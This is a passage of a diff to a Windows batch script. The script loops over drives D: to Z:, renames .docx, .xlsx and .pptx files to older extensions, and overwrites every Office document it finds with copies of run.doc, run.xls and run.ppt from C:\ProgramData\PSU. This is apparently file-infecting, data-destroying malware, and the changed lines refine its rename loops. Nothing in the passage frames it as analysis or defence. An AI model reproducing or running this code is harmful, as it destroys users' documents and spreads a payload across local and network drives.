@@ -125,75 +125,75 @@ if exist X: (for /f "delims=" %%h in ('dir X:\*.pptx /s /b') do copy /Y "C:\Prog
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.pptx /s /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "%%h"
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.pptx /s /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "%%h"
 
-for /R "D:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "E:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "F:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "G:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "H:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "I:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "J:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "K:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "L:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "M:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "N:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "O:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "P:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "Q:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "R:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "S:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "T:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "U:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "V:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "W:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "X:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "Y:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "Z:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "D:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "E:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "F:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "G:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "H:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "I:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "J:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "K:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "L:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "M:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "N:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "O:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "P:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "Q:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "R:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "S:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "T:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "U:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "V:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "W:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "X:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "Y:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "Z:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "D:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "E:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "F:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "G:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "H:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "I:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "J:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "K:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "L:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "M:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "N:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "O:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "P:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "Q:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "R:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "S:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "T:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "U:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "V:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "W:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "X:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "Y:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "Z:" %%f in (*.pptx) do ren "%%f" *.ppt
+if exist D: (for /f "delims=" %%h in ('dir D:\*.docx /s /b') do ren "%%h" *.doc
+if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc
+if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc
+if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /s /b') do ren "%%h" *.doc
+if exist H: (for /f "delims=" %%h in ('dir H:\*.docx /s /b') do ren "%%h" *.doc
+if exist I: (for /f "delims=" %%h in ('dir I:\*.docx /s /b') do ren "%%h" *.doc
+if exist J: (for /f "delims=" %%h in ('dir J:\*.docx /s /b') do ren "%%h" *.doc
+if exist K: (for /f "delims=" %%h in ('dir K:\*.docx /s /b') do ren "%%h" *.doc
+if exist L: (for /f "delims=" %%h in ('dir L:\*.docx /s /b') do ren "%%h" *.doc
+if exist M: (for /f "delims=" %%h in ('dir M:\*.docx /s /b') do ren "%%h" *.doc
+if exist N: (for /f "delims=" %%h in ('dir N:\*.docx /s /b') do ren "%%h" *.doc
+if exist O: (for /f "delims=" %%h in ('dir O:\*.docx /s /b') do ren "%%h" *.doc
+if exist P: (for /f "delims=" %%h in ('dir P:\*.docx /s /b') do ren "%%h" *.doc
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.docx /s /b') do ren "%%h" *.doc
+if exist R: (for /f "delims=" %%h in ('dir R:\*.docx /s /b') do ren "%%h" *.doc
+if exist S: (for /f "delims=" %%h in ('dir S:\*.docx /s /b') do ren "%%h" *.doc
+if exist T: (for /f "delims=" %%h in ('dir T:\*.docx /s /b') do ren "%%h" *.doc
+if exist U: (for /f "delims=" %%h in ('dir U:\*.docx /s /b') do ren "%%h" *.doc
+if exist V: (for /f "delims=" %%h in ('dir V:\*.docx /s /b') do ren "%%h" *.doc
+if exist W: (for /f "delims=" %%h in ('dir W:\*.docx /s /b') do ren "%%h" *.doc
+if exist X: (for /f "delims=" %%h in ('dir X:\*.docx /s /b') do ren "%%h" *.doc
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.docx /s /b') do ren "%%h" *.doc
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.docx /s /b') do ren "%%h" *.doc
+if exist D: (for /f "delims=" %%h in ('dir D:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist E: (for /f "delims=" %%h in ('dir E:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist F: (for /f "delims=" %%h in ('dir F:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist G: (for /f "delims=" %%h in ('dir G:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist H: (for /f "delims=" %%h in ('dir H:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist I: (for /f "delims=" %%h in ('dir I:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist J: (for /f "delims=" %%h in ('dir J:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist K: (for /f "delims=" %%h in ('dir K:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist L: (for /f "delims=" %%h in ('dir L:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist M: (for /f "delims=" %%h in ('dir M:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist N: (for /f "delims=" %%h in ('dir N:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist O: (for /f "delims=" %%h in ('dir O:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist P: (for /f "delims=" %%h in ('dir P:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist R: (for /f "delims=" %%h in ('dir R:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist S: (for /f "delims=" %%h in ('dir S:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist T: (for /f "delims=" %%h in ('dir T:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist U: (for /f "delims=" %%h in ('dir U:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist V: (for /f "delims=" %%h in ('dir V:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist W: (for /f "delims=" %%h in ('dir W:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist X: (for /f "delims=" %%h in ('dir X:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist D: (for /f "delims=" %%h in ('dir D:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist E: (for /f "delims=" %%h in ('dir E:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist F: (for /f "delims=" %%h in ('dir F:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist G: (for /f "delims=" %%h in ('dir G:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist H: (for /f "delims=" %%h in ('dir H:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist I: (for /f "delims=" %%h in ('dir I:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist J: (for /f "delims=" %%h in ('dir J:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist K: (for /f "delims=" %%h in ('dir K:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist L: (for /f "delims=" %%h in ('dir L:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist M: (for /f "delims=" %%h in ('dir M:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist N: (for /f "delims=" %%h in ('dir N:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist O: (for /f "delims=" %%h in ('dir O:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist P: (for /f "delims=" %%h in ('dir P:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist R: (for /f "delims=" %%h in ('dir R:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist S: (for /f "delims=" %%h in ('dir S:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist T: (for /f "delims=" %%h in ('dir T:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist U: (for /f "delims=" %%h in ('dir U:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist V: (for /f "delims=" %%h in ('dir V:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist W: (for /f "delims=" %%h in ('dir W:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist X: (for /f "delims=" %%h in ('dir X:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.pptx /s /b') do ren "%%h" *.ppt
 
 if exist D: (for /f "delims=" %%h in ('dir D:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -389,75 +389,75 @@ if exist X: (for /f "delims=" %%h in ('dir X:\*.pptx /s /b') do copy /Y "C:\Prog
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.pptx /s /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "%%h"
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.pptx /s /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "%%h"
 
-for /R "D:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "E:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "F:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "G:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "H:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "I:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "J:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "K:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "L:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "M:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "N:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "O:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "P:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "Q:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "R:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "S:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "T:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "U:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "V:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "W:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "X:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "Y:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "Z:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "D:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "E:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "F:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "G:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "H:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "I:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "J:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "K:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "L:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "M:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "N:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "O:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "P:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "Q:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "R:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "S:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "T:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "U:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "V:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "W:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "X:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "Y:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "Z:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "D:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "E:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "F:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "G:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "H:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "I:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "J:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "K:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "L:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "M:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "N:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "O:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "P:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "Q:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "R:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "S:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "T:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "U:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "V:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "W:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "X:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "Y:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "Z:" %%f in (*.pptx) do ren "%%f" *.ppt
+if exist D: (for /f "delims=" %%h in ('dir D:\*.docx /s /b') do ren "%%h" *.doc
+if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc
+if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc
+if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /s /b') do ren "%%h" *.doc
+if exist H: (for /f "delims=" %%h in ('dir H:\*.docx /s /b') do ren "%%h" *.doc
+if exist I: (for /f "delims=" %%h in ('dir I:\*.docx /s /b') do ren "%%h" *.doc
+if exist J: (for /f "delims=" %%h in ('dir J:\*.docx /s /b') do ren "%%h" *.doc
+if exist K: (for /f "delims=" %%h in ('dir K:\*.docx /s /b') do ren "%%h" *.doc
+if exist L: (for /f "delims=" %%h in ('dir L:\*.docx /s /b') do ren "%%h" *.doc
+if exist M: (for /f "delims=" %%h in ('dir M:\*.docx /s /b') do ren "%%h" *.doc
+if exist N: (for /f "delims=" %%h in ('dir N:\*.docx /s /b') do ren "%%h" *.doc
+if exist O: (for /f "delims=" %%h in ('dir O:\*.docx /s /b') do ren "%%h" *.doc
+if exist P: (for /f "delims=" %%h in ('dir P:\*.docx /s /b') do ren "%%h" *.doc
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.docx /s /b') do ren "%%h" *.doc
+if exist R: (for /f "delims=" %%h in ('dir R:\*.docx /s /b') do ren "%%h" *.doc
+if exist S: (for /f "delims=" %%h in ('dir S:\*.docx /s /b') do ren "%%h" *.doc
+if exist T: (for /f "delims=" %%h in ('dir T:\*.docx /s /b') do ren "%%h" *.doc
+if exist U: (for /f "delims=" %%h in ('dir U:\*.docx /s /b') do ren "%%h" *.doc
+if exist V: (for /f "delims=" %%h in ('dir V:\*.docx /s /b') do ren "%%h" *.doc
+if exist W: (for /f "delims=" %%h in ('dir W:\*.docx /s /b') do ren "%%h" *.doc
+if exist X: (for /f "delims=" %%h in ('dir X:\*.docx /s /b') do ren "%%h" *.doc
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.docx /s /b') do ren "%%h" *.doc
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.docx /s /b') do ren "%%h" *.doc
+if exist D: (for /f "delims=" %%h in ('dir D:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist E: (for /f "delims=" %%h in ('dir E:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist F: (for /f "delims=" %%h in ('dir F:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist G: (for /f "delims=" %%h in ('dir G:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist H: (for /f "delims=" %%h in ('dir H:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist I: (for /f "delims=" %%h in ('dir I:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist J: (for /f "delims=" %%h in ('dir J:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist K: (for /f "delims=" %%h in ('dir K:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist L: (for /f "delims=" %%h in ('dir L:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist M: (for /f "delims=" %%h in ('dir M:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist N: (for /f "delims=" %%h in ('dir N:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist O: (for /f "delims=" %%h in ('dir O:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist P: (for /f "delims=" %%h in ('dir P:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist R: (for /f "delims=" %%h in ('dir R:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist S: (for /f "delims=" %%h in ('dir S:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist T: (for /f "delims=" %%h in ('dir T:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist U: (for /f "delims=" %%h in ('dir U:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist V: (for /f "delims=" %%h in ('dir V:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist W: (for /f "delims=" %%h in ('dir W:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist X: (for /f "delims=" %%h in ('dir X:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist D: (for /f "delims=" %%h in ('dir D:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist E: (for /f "delims=" %%h in ('dir E:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist F: (for /f "delims=" %%h in ('dir F:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist G: (for /f "delims=" %%h in ('dir G:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist H: (for /f "delims=" %%h in ('dir H:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist I: (for /f "delims=" %%h in ('dir I:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist J: (for /f "delims=" %%h in ('dir J:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist K: (for /f "delims=" %%h in ('dir K:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist L: (for /f "delims=" %%h in ('dir L:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist M: (for /f "delims=" %%h in ('dir M:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist N: (for /f "delims=" %%h in ('dir N:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist O: (for /f "delims=" %%h in ('dir O:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist P: (for /f "delims=" %%h in ('dir P:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist R: (for /f "delims=" %%h in ('dir R:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist S: (for /f "delims=" %%h in ('dir S:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist T: (for /f "delims=" %%h in ('dir T:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist U: (for /f "delims=" %%h in ('dir U:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist V: (for /f "delims=" %%h in ('dir V:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist W: (for /f "delims=" %%h in ('dir W:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist X: (for /f "delims=" %%h in ('dir X:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.pptx /s /b') do ren "%%h" *.ppt
 
 if exist D: (for /f "delims=" %%h in ('dir D:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -653,75 +653,75 @@ if exist X: (for /f "delims=" %%h in ('dir X:\*.pptx /s /b') do copy /Y "C:\Prog
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.pptx /s /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "%%h"
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.pptx /s /b') do copy /Y "C:\ProgramData\PSU\run.ppt" "%%h"
 
-for /R "D:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "E:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "F:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "G:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "H:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "I:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "J:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "K:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "L:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "M:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "N:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "O:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "P:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "Q:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "R:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "S:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "T:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "U:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "V:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "W:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "X:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "Y:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "Z:" %%f in (*.docx) do ren "%%f" *.doc
-for /R "D:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "E:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "F:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "G:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "H:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "I:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "J:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "K:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "L:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "M:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "N:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "O:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "P:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "Q:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "R:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "S:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "T:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "U:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "V:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "W:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "X:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "Y:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "Z:" %%f in (*.xlsx) do ren "%%f" *.xls
-for /R "D:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "E:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "F:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "G:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "H:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "I:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "J:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "K:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "L:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "M:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "N:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "O:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "P:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "Q:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "R:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "S:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "T:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "U:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "V:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "W:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "X:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "Y:" %%f in (*.pptx) do ren "%%f" *.ppt
-for /R "Z:" %%f in (*.pptx) do ren "%%f" *.ppt
+if exist D: (for /f "delims=" %%h in ('dir D:\*.docx /s /b') do ren "%%h" *.doc
+if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc
+if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc
+if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /s /b') do ren "%%h" *.doc
+if exist H: (for /f "delims=" %%h in ('dir H:\*.docx /s /b') do ren "%%h" *.doc
+if exist I: (for /f "delims=" %%h in ('dir I:\*.docx /s /b') do ren "%%h" *.doc
+if exist J: (for /f "delims=" %%h in ('dir J:\*.docx /s /b') do ren "%%h" *.doc
+if exist K: (for /f "delims=" %%h in ('dir K:\*.docx /s /b') do ren "%%h" *.doc
+if exist L: (for /f "delims=" %%h in ('dir L:\*.docx /s /b') do ren "%%h" *.doc
+if exist M: (for /f "delims=" %%h in ('dir M:\*.docx /s /b') do ren "%%h" *.doc
+if exist N: (for /f "delims=" %%h in ('dir N:\*.docx /s /b') do ren "%%h" *.doc
